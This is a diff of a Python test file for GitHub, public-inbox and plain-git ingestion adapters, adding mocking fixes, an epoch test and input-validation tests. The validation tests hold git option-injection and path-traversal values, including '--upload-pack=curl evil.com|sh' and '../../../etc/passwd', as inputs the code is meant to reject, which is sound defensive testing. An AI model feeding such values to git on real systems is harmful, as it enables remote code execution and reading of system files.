@@ -7,7 +7,6 @@ Uses:
 
 from __future__ import annotations
 
-import json
 import subprocess
 from datetime import datetime, timezone
 from pathlib import Path
@@ -38,6 +37,7 @@ class TestGitHubAdapter:
             "state": "open",
             "draft": False,
             "labels": [],
+            "changed_files": 3,
         }
 
     def _make_commit(self, sha: str = "abc123") -> dict:
@@ -59,24 +59,18 @@ class TestGitHubAdapter:
     def test_fetch_discussions(self):
         try:
             import respx
-            import httpx
         except ImportError:
             pytest.skip("respx not installed")
 
-        adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
         pr = self._make_pr()
-
+        # Create adapter INSIDE the mock context so the persistent client is mocked
         with respx.mock(base_url="https://api.github.com") as mock:
-            mock.get(
-                "/repos/gcc-mirror/gcc/pulls",
-            ).respond(200, json=[pr])
-            mock.get(
-                "/repos/gcc-mirror/gcc/pulls/101/comments",
-            ).respond(200, json=[])
-            # PR diff
-            mock.get(
-                "/repos/gcc-mirror/gcc/pulls/101",
-            ).respond(200, text="diff --git a/gcc/ipa-inline.cc b/gcc/ipa-inline.cc\n")
+            adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
+            mock.get("/repos/gcc-mirror/gcc/pulls").respond(200, json=[pr])
+            mock.get("/repos/gcc-mirror/gcc/pulls/101/comments").respond(200, json=[])
+            mock.get("/repos/gcc-mirror/gcc/pulls/101").respond(
+                200, text="diff --git a/gcc/ipa-inline.cc b/gcc/ipa-inline.cc\n"
+            )
 
             discussions = adapter.fetch_discussions(since_hours=24)
 
@@ -90,14 +84,12 @@ class TestGitHubAdapter:
     def test_fetch_commits(self):
         try:
             import respx
-            import httpx
         except ImportError:
             pytest.skip("respx not installed")
 
-        adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
         commit = self._make_commit("deadbeef")
-
         with respx.mock(base_url="https://api.github.com") as mock:
+            adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
             mock.get("/repos/gcc-mirror/gcc/commits").respond(200, json=[commit])
 
             commits = adapter.fetch_commits(since_hours=24)
@@ -111,14 +103,12 @@ class TestGitHubAdapter:
     def test_http_error_on_comments_returns_empty_replies(self):
         try:
             import respx
-            import httpx
         except ImportError:
             pytest.skip("respx not installed")
 
-        adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
         pr = self._make_pr(200)
-
         with respx.mock(base_url="https://api.github.com") as mock:
+            adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
             mock.get("/repos/gcc-mirror/gcc/pulls").respond(200, json=[pr])
             mock.get("/repos/gcc-mirror/gcc/pulls/200/comments").respond(500, json={})
             mock.get("/repos/gcc-mirror/gcc/pulls/200").respond(200, text="")
@@ -126,6 +116,26 @@ class TestGitHubAdapter:
             discussions = adapter.fetch_discussions(since_hours=24)
 
         assert discussions[0].replies == []
+
+    def test_large_pr_diff_skipped(self):
+        """PRs with >500 changed_files must not trigger a diff fetch."""
+        try:
+            import respx
+        except ImportError:
+            pytest.skip("respx not installed")
+
+        pr = self._make_pr(300)
+        pr["changed_files"] = 600  # exceeds threshold
+
+        with respx.mock(base_url="https://api.github.com") as mock:
+            adapter = GitHubAdapter("gcc-mirror", "gcc", token="fake-token")
+            mock.get("/repos/gcc-mirror/gcc/pulls").respond(200, json=[pr])
+            mock.get("/repos/gcc-mirror/gcc/pulls/300/comments").respond(200, json=[])
+            # Diff endpoint should NOT be called — if it is, respx raises
+
+            discussions = adapter.fetch_discussions(since_hours=24)
+
+        assert discussions[0].diff_text is None
 
 
 # ---------------------------------------------------------------------------
@@ -152,7 +162,6 @@ class TestPublicInboxAdapter:
             discussion_lists=["gcc"],
             cvs_lists=[],
             cache_dir=tmp_path,
-            use_nntp=False,
         )
 
         sha = "abc123def456"
@@ -170,8 +179,9 @@ class TestPublicInboxAdapter:
                 r.stdout = b""
             return r
 
+        # _mirror_list now returns list[Path] — mock returns a list
         with (
-            patch("agents.adapters.public_inbox._mirror_list", return_value=mock_mirror),
+            patch("agents.adapters.public_inbox._mirror_list", return_value=[mock_mirror]),
             patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
         ):
             discussions = adapter.fetch_discussions(since_hours=999)
@@ -181,29 +191,87 @@ class TestPublicInboxAdapter:
         assert d.source_type == "public_inbox"
         assert "inline" in d.title.lower()
 
-    def test_nntp_fallback_on_mirror_failure(self, tmp_path: Path):
+    def test_all_epochs_iterated(self, tmp_path: Path):
+        """Messages from epoch 1+ must appear in results, not just epoch 0."""
         from agents.adapters.public_inbox import PublicInboxAdapter
 
         adapter = PublicInboxAdapter(
             discussion_lists=["gcc"],
             cvs_lists=[],
             cache_dir=tmp_path,
-            use_nntp=True,
         )
+
+        sha0 = "a" * 40
+        sha1 = "b" * 40
+        epoch0 = tmp_path / "gcc.0.git"
+        epoch1 = tmp_path / "gcc.1.git"
+        epoch0.mkdir()
+        epoch1.mkdir()
+
+        # Each epoch must have a distinct Message-ID, otherwise the dedup
+        # logic (seen_ids) correctly suppresses the duplicate.
+        MBOX_EPOCH0 = SAMPLE_MBOX.replace(b"patch-42@gcc.gnu.org", b"patch-42@gcc.gnu.org")
+        MBOX_EPOCH1 = SAMPLE_MBOX.replace(b"patch-42@gcc.gnu.org", b"patch-99@gcc.gnu.org")
+
+        def fake_run(cmd, cwd=None, **kwargs):
+            r = MagicMock()
+            r.returncode = 0
+            if "log" in cmd:
+                r.stdout = f"{sha0}\n" if cwd == epoch0 else f"{sha1}\n"
+            elif "show" in cmd:
+                r.stdout = MBOX_EPOCH0 if cwd == epoch0 else MBOX_EPOCH1
+            else:
+                r.stdout = b""
+            return r
 
         with (
             patch(
                 "agents.adapters.public_inbox._mirror_list",
-                side_effect=RuntimeError("network error"),
+                return_value=[epoch0, epoch1],
             ),
-            patch(
-                "agents.adapters.public_inbox.nntplib.NNTP",
-                side_effect=ConnectionRefusedError("NNTP down"),
-            ),
+            patch("agents.adapters.public_inbox.subprocess.run", side_effect=fake_run),
+        ):
+            discussions = adapter.fetch_discussions(since_hours=999)
+
+        # Both epochs should contribute one distinct discussion each
+        assert len(discussions) == 2
+        ids = {d.id for d in discussions}
+        assert "patch-42@gcc.gnu.org" in ids
+        assert "patch-99@gcc.gnu.org" in ids
+
+    def test_mirror_failure_returns_empty(self, tmp_path: Path):
+        """When _mirror_list returns [], adapter must return [] without raising."""
+        from agents.adapters.public_inbox import PublicInboxAdapter
+
+        adapter = PublicInboxAdapter(
+            discussion_lists=["gcc"],
+            cvs_lists=[],
+            cache_dir=tmp_path,
+        )
+
+        # _mirror_list returning [] simulates a total network failure
+        with patch(
+            "agents.adapters.public_inbox._mirror_list",
+            return_value=[],
         ):
             result = adapter.fetch_discussions(since_hours=24)
 
         assert result == []
+
+    def test_invalid_list_name_rejected(self, tmp_path: Path):
+        """List names that could cause git-option injection must be rejected."""
+        from agents.adapters.public_inbox import PublicInboxAdapter, _validate_list_name
+        import pytest
+
+        with pytest.raises(ValueError, match="Invalid list name"):
+            _validate_list_name("--upload-pack=evil")
+
+        with pytest.raises(ValueError, match="Invalid list name"):
+            PublicInboxAdapter(
+                discussion_lists=["../../../etc/passwd"],
+                cvs_lists=[],
+                cache_dir=tmp_path,
+            )
 
 
 # ---------------------------------------------------------------------------
@@ -233,9 +301,7 @@ class TestPlainGitAdapter:
             if "clone" in cmd or "fetch" in cmd:
                 return MagicMock(returncode=0, stdout="", stderr="")
             if "log" in cmd:
-                return MagicMock(
-                    returncode=0, stdout=_GIT_LOG_LINE + "\n", stderr=""
-                )
+                return MagicMock(returncode=0, stdout=_GIT_LOG_LINE + "\n", stderr="")
             if "diff-tree" in cmd:
                 return MagicMock(returncode=0, stdout="+45/-12\n", stderr="")
             return MagicMock(returncode=0, stdout="", stderr="")
@@ -267,9 +333,26 @@ class TestPlainGitAdapter:
 
         assert commits == []
 
+    def test_invalid_url_rejected(self, tmp_path: Path):
+        """repo_url with disallowed scheme must raise ValueError immediately."""
+        with pytest.raises(ValueError, match="Unsafe repo_url"):
+            PlainGitAdapter(
+                repo_url="--upload-pack=curl evil.com|sh",
+                cache_dir=tmp_path,
+            )
+
+    def test_invalid_branch_rejected(self, tmp_path: Path):
+        """Branch names that start with - or contain shell meta chars are rejected."""
+        with pytest.raises(ValueError, match="Unsafe branch name"):
+            PlainGitAdapter(
+                repo_url="https://example.com/repo.git",
+                branch="-c core.sshCommand=evil",
+                cache_dir=tmp_path,
+            )
+
 
 # ---------------------------------------------------------------------------
-# IngestionEngine — deduplication
+# IngestionEngine — deduplication and fault isolation
 # ---------------------------------------------------------------------------
 
 class TestEngineDeduplication:
@@ -331,8 +414,8 @@ class TestEngineDeduplication:
         result = engine.run()
         assert len(result["commits"]) == 1
 
-    def test_nntp_fallback_test(self):
-        """Adapter errors must not propagate — engine returns empty lists."""
+    def test_adapter_exception_does_not_propagate(self):
+        """Adapter errors must be caught by the engine — results are empty, not raises."""
         class BrokenSource:
             def fetch_discussions(self, since_hours=24):
                 raise RuntimeError("adapter exploded")
